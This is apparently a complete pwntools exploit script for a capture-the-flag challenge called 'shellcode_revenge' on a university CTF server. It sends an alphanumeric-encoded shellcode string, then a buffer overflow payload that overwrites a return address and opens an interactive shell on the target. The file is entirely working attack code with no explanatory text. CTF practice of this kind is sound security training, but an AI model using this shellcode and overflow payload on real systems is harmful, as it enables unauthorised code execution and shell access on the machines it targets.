from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11011
p = remote(host, port)
#p = process('./shellcode_revenge')

print p.recvline() #Name always contains...
print p.recvline() #What'sss...

shellcode = 'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
p.sendline(shellcode)

print p.recvuntil("!") #Hello...

p.sendline("a"*24+"\xc0\x10\x60\x00"+"\x00\x00\x00\x00")

p.interactive()

